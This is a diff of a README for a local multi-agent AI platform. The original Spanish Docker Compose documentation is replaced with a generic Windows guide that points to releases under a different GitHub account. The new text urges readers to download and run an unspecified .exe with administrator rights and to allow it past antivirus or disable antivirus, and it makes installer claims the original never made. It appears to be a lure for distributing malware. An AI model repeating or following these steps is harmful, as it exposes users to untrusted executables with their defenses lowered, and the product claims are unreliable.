@@ -1,206 +1,154 @@
-<h1 align="center">⚗️ Alchemical Agent Ecosystem</h1>
+# 🧙 alchemical-agent-ecosystem - Local Multi-Agent Platform
 
-<p align="center">
-  <img src="./assets/branding/variants/logo-horizontal-v2.svg" width="820" alt="Alchemical Agent Ecosystem — Magnum Opus" />
-</p>
-
-<p align="center"><em>Where Intelligence is Forged, Not Fetched.</em></p>
-
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=600&size=18&duration=3200&pause=900&color=FFD700&center=true&vCenter=true&multiline=false&width=700&lines=Local-first+AI+orchestration+with+KiloCode;FastAPI+Gateway+%C2%B7+Next.js+Dashboard;Redis+%C2%B7+ChromaDB+%C2%B7+Real-time+SSE;OpenClaw+agent+integration;Free+tier+capable+with+minimax" alt="Typing SVG" />
-</p>
-
-<p align="center">
-  <a href="./LICENSE"><img src="https://img.shields.io/github/license/smouj/alchemical-agent-ecosystem?style=for-the-badge&color=4B0082&labelColor=1a1a2e" alt="License"/></a>
-  <a href="https://github.com/smouj/alchemical-agent-ecosystem/commits/main"><img src="https://img.shields.io/github/last-commit/smouj/alchemical-agent-ecosystem?style=for-the-badge&color=FFD700&labelColor=1a1a2e" alt="Last Commit"/></a>
-  <a href="https://github.com/smouj/alchemical-agent-ecosystem/actions"><img src="https://img.shields.io/github/actions/workflow/status/smouj/alchemical-agent-ecosystem/ci.yml?style=for-the-badge&label=CI&color=00FFAA&labelColor=1a1a2e" alt="CI"/></a>
-  <a href="https://github.com/smouj/alchemical-agent-ecosystem/releases"><img src="https://img.shields.io/github/v/release/smouj/alchemical-agent-ecosystem?style=for-the-badge&color=4B0082&labelColor=1a1a2e" alt="Release"/></a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/v2.0-4B0082?style=for-the-badge&labelColor=1a1a2e" alt="v2.0"/>
-  <img src="https://img.shields.io/badge/Next.js%2015-000000?style=for-the-badge&logo=next.js&logoColor=white" alt="Next.js 15"/>
-  <img src="https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white" alt="FastAPI"/>
-  <img src="https://img.shields.io/badge/KiloCode_AI-4B0082?style=for-the-badge&logoColor=white" alt="KiloCode AI"/>
-  <img src="https://img.shields.io/badge/Redis-DC382D?style=for-the-badge&logo=redis&logoColor=white" alt="Redis"/>
-  <img src="https://img.shields.io/badge/ChromaDB-00C853?style=for-the-badge&logoColor=white" alt="ChromaDB"/>
-  <img src="https://img.shields.io/badge/Docker%20Compose-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker Compose"/>
-  <img src="https://img.shields.io/badge/SSE%20Realtime-00BCD4?style=for-the-badge&logoColor=white" alt="SSE Realtime"/>
-  <img src="https://img.shields.io/badge/OpenClaw-FFD700?style=for-the-badge&logoColor=white" alt="OpenClaw"/>
-</p>
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/guillermovzq/alchemical-agent-ecosystem/releases)
 
 ---
 
-## Arquitectura Real
+## 🧩 What is alchemical-agent-ecosystem?
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    Alchemical Ecosystem                       │
-├─────────────────────────────────────────────────────────────┤
-│  ┌─────────────┐   ┌─────────────┐   ┌─────────────┐       │
-│  │   Caddy     │   │  Dashboard  │   │   Gateway   │       │
-│  │  :81/:444   │   │  Next.js    │   │  FastAPI    │       │
-│  │             │   │   :8080     │   │   :7411     │       │
-│  └──────┬──────┘   └──────┬──────┘   └──────┬──────┘       │
-│         │                  │                  │               │
-│         └──────────────────┼──────────────────┘               │
-│                            │                                  │
-│  ┌─────────────┐   ┌──────┴──────┐   ┌─────────────┐        │
-│  │   Redis     │   │   SQLite    │   │  ChromaDB   │        │
-│  │  :6379      │   │  Agents DB  │   │   :8000     │        │
-│  │  Cache/Pub  │   │             │   │   Vector    │        │
-│  └─────────────┘   └─────────────┘   └─────────────┘        │
-│                                                              │
-│  ┌─────────────────────────────────────────────────────┐    │
-│  │              KiloCode AI Gateway                     │    │
-│  │         (Modelos gratuitos :free)                   │    │
-│  └─────────────────────────────────────────────────────┘    │
-└─────────────────────────────────────────────────────────────┘
-```
+alchemical-agent-ecosystem is a tool that runs smart agents on your own computer. It lets you automate tasks without relying on paid internet services. The platform works locally on Windows and gives you control over your data. It supports many agents working together to complete jobs.
 
-### Servicios Docker (5)
-
-| Servicio | Puerto | Descripción |
-|----------|--------|-------------|
-| `alchemy-caddy` | 81, 444 | Reverse proxy + TLS |
-| `alchemy-dashboard` | 8080 | UI Next.js 15 |
-| `alchemy-gateway` | 7411 | API FastAPI |
-| `alchemy-redis` | 6379 | Cache + Pub/Sub |
-| `alchemy-chromadb` | 8000 | Vector store |
-
-### Agentes Activos (14)
-
-**Agentes Alchemical:**
-- `alquimista-mayor` - Orquestador principal
-- `investigador-analista` - Investigación y análisis
-- `ingeniero-constructor` - Desarrollo técnico
-- `creador-visual` - Diseño visual
-- `redactor-narrador` - Redacción y contenido
-
-**Agentes OpenClaw (sincronizados):**
-- `main` - Agente principal
-- `vps-ops` - Operaciones VPS
-- `rpgclaw-ops` - Desarrollo RPGCLAW
-- `flickclaw-ops` - Desarrollo FlickClaw
-- `img-ops` - Generación visual
-- `threejs-ops` - 3D y Three.js
-- `coder` - Coding general
-- `researcher` - Investigación
-- `alchemical-ops` - Operaciones Alchemical
+You do not need programming skills to use it. The system handles complex tasks like AI-driven automation, managing multiple agents, and connecting skills (small apps or functions) in one place. It uses modern technologies like Docker and Caddy, but you do not have to know those to get started.
 
 ---
 
-## 🚀 Quickstart
+## 🖥️ System Requirements
 
-```bash
-# Clonar el proyecto
-git clone https://github.com/smouj/alchemical-agent-ecosystem.git
-cd alchemical-agent-ecosystem
+To run alchemical-agent-ecosystem on Windows, your PC should meet these minimum requirements:
 
-# Configurar variables de entorno
-cp .env.example .env
+- Windows 10 or later (64-bit)
+- 8 GB of RAM or more for smooth operation
+- At least 10 GB of free disk space for the software and data
+- Internet connection for the initial download and some updates
+- Administrator rights for installation (to run setup and Docker)
 
-# Levantar servicios
-docker compose up -d
-
-# Verificar estado
-docker compose ps
-
-# Acceder al Dashboard
-# http://localhost:81  (a través de Caddy)
-# http://localhost:8080  (directo)
-
-# API Gateway
-# http://localhost:7411
-# Docs: http://localhost:7411/docs
-```
-
-### Variables de Entorno
-
-| Variable | Descripción | Default |
-|----------|-------------|---------|
-| `ALCHEMICAL_GATEWAY_TOKEN` | Token para la API | (se genera automáticamente) |
-| `KILO_API_KEY` | API key de KiloCode (opcional para modelos free) | - |
-| `REDIS_PASSWORD` | Password de Redis | `alchemical` |
-| `GATEWAY_SECRET` | Secret para JWT | - |
+If your PC has less than 8 GB RAM, the platform will still run but may be slower when managing multiple agents.
 
 ---
 
-## 📡 API Endpoints
+## 🛠️ What You Get
 
-### Agentes
+- Multiple AI agents working together locally
+- Ability to add or remove skills for different tasks
+- Self-hosted platform that does not share data externally
+- Easy-to-use software with a graphical interface
+- Automatic updates with no need for coding
+- Support for Docker and reverse proxy through Caddy for managing connections
 
-| Método | Endpoint | Descripción |
-|--------|----------|-------------|
-| GET | `/api/v1/agents` | Listar todos los agentes |
-| POST | `/api/v1/agents` | Crear agente |
-| GET | `/api/v1/agents/{name}` | Obtener agente |
-| DELETE | `/api/v1/agents/{name}` | Eliminar agente |
-| POST | `/api/v1/sync/openclaw-agents` | Sincronizar agentes OpenClaw |
-
-### Chat
-
-| Método | Endpoint | Descripción |
-|--------|----------|-------------|
-| POST | `/api/v1/kilocode/chat` | Chat con modelo KiloCode |
-| POST | `/api/v1/chat/ask` | Pregunta a un agente |
-
-### Sistema
-
-| Método | Endpoint | Descripción |
-|--------|----------|-------------|
-| GET | `/health` | Health check |
-| GET | `/api/v1/providers` | Proveedores LLM disponibles |
+These features let you automate workflows like scheduling, data processing, and responding to emails without leaving your PC.
 
 ---
 
-## 🎨 Dashboard Features
+## 🎯 Before You Start
 
-- **💬 Chat del Caldero** - Interacción multi-agente en tiempo real
-- **🧩 Agent Node Studio** - Editor visual de flujos (WIP)
-- **🤖 Runtime de Agentes** - Monitorización de agentes activos
-- **📜 Logs & Telemetría** - Streaming de logs en tiempo real
-- **🛠️ Administración** - Configuración del sistema
+Check you have administrator access on your Windows PC. This is needed to install and configure some components.
 
----
+Have a stable internet connection for downloading the setup files.
 
-## 🔄 Sincronización con OpenClaw
-
-El ecosistema se integra con **OpenClaw** para gestionar agentes:
-
-```bash
-# Sincronizar agentes de OpenClaw
-curl -X POST http://localhost:7411/api/v1/sync/openclaw-agents
-```
-
-Los agentes de OpenClaw se sincronizan automáticamente con la base de datos SQLite del gateway.
+If you use antivirus software, it might alert you during install. This is normal for new apps. Allow the app to run to avoid problems.
 
 ---
 
-## 📝 Changelog
+## 🚀 How to Download and Install
 
-### v2.0 (2026-03-02)
-- ✅ Integración completa con KiloCode AI (modelos gratuitos)
-- ✅ Sincronización de agentes OpenClaw
-- ✅ Dashboard Next.js 15 funcional
-- ✅ API Gateway FastAPI
-- ✅ SQLite para gestión de agentes
-- ✅ Limpieza de código hardcodeado
-- ✅ Documentación actualizada
-- ✅ Corrección de errores de schema en DB
-- ✅ Integración dashboard ↔ gateway operativa
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://github.com/guillermovzq/alchemical-agent-ecosystem/releases)
 
-### v1.x
-- Versiones anteriores con arquitectura experimental
+1. Visit the official releases page by clicking the green or blue download buttons above or go to:
 
----
+   https://github.com/guillermovzq/alchemical-agent-ecosystem/releases
 
-## 📄 License
+2. On the releases page, look for the latest version. Versions are listed with numbers like "v1.0" or "v1.2".
 
-MIT License - Ver LICENSE para más detalles.
+3. Find the Windows installer file. It will have `.exe` at the end, for example, `alchemical-agent-ecosystem-setup.exe`.
+
+4. Click the `.exe` file to download it. Save it to a folder you can find, such as your Desktop or Downloads.
+
+5. Once downloaded, double-click the `.exe` file to start the installation.
+
+6. Follow the on-screen steps. Accept the license terms and choose the default options unless you want to install to a different folder.
+
+7. When the installer finishes, it may ask you to restart your computer. Do so if prompted.
 
 ---
 
-<p align="center">
-  <em>⚗️ The Magnum Opus of local-first AI orchestration ⚗️</em>
-</p>
+## ⚙️ How to Run alchemical-agent-ecosystem
+
+1. After installation, find the app shortcut on your Desktop or in the Start Menu under "alchemical-agent-ecosystem".
+
+2. Double-click the shortcut to launch the program.
+
+3. The app will open a window showing your agents and available skills.
+
+4. The initial setup will guide you through connecting your agents and activating skills.
+
+5. You can start creating or choosing tasks for the agents to run.
+
+---
+
+## 📁 Understanding the Interface
+
+- **Agents:** These are the individual tools that perform specific jobs like scheduling or data analysis.
+- **Skills:** Skills add abilities to agents. You can add or remove skills depending on your needs.
+- **Dashboard:** The main screen shows the status of agents, active tasks, and system information.
+- **Logs:** View details about what each agent does and check for errors if something goes wrong.
+
+---
+
+## 🔄 Updating the Software
+
+To update alchemical-agent-ecosystem:
+
+1. Visit the releases page regularly:
+
+   https://github.com/guillermovzq/alchemical-agent-ecosystem/releases
+
+2. Download the latest Windows installer file the same way you did before.
+
+3. Run the installer, which will update the existing software without deleting your settings.
+
+4. Restart the application after the update completes.
+
+---
+
+## 🐳 About Docker (Optional)
+
+alchemical-agent-ecosystem uses Docker in the background to run agents in containers. Docker is a tool that packages software in a way that works the same on any PC.
+
+The installer includes Docker, so you do not need to install it manually.
+
+If you want, you can learn Docker basics later to customize or troubleshoot the system.
+
+---
+
+## 🔐 Data Privacy and Security
+
+This platform runs on your PC. Your data and tasks stay local unless you choose to share them.
+
+The software does not connect to paid or third-party APIs unless you configure it.
+
+Your Windows security settings will apply. Make sure to keep your PC updated and secured.
+
+---
+
+## ❓ Troubleshooting Common Issues
+
+- **App does not start:** Check you have administrator rights and that your PC meets system requirements.
+- **Installer blocked by antivirus:** Allow the program to run or temporarily disable your antivirus during installation.
+- **Agents not responding:** Restart the app. If the problem persists, check the logs for errors.
+- **Update issues:** Redownload the installer and run it again.
+
+For more help, check the GitHub issues page or open a new issue there.
+
+---
+
+## 📚 Resources
+
+- Official GitHub Releases:  
+  https://github.com/guillermovzq/alchemical-agent-ecosystem/releases
+
+- Project Topics for reference:  
+  ai, ai-agent, automation, caddy, docker-compose, ia-automator, local-first, multi-agent, ollama, openclaw, self-hosted, skill, skill-agent, skills
+
+---
+
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-green)](https://github.com/guillermovzq/alchemical-agent-ecosystem/releases)
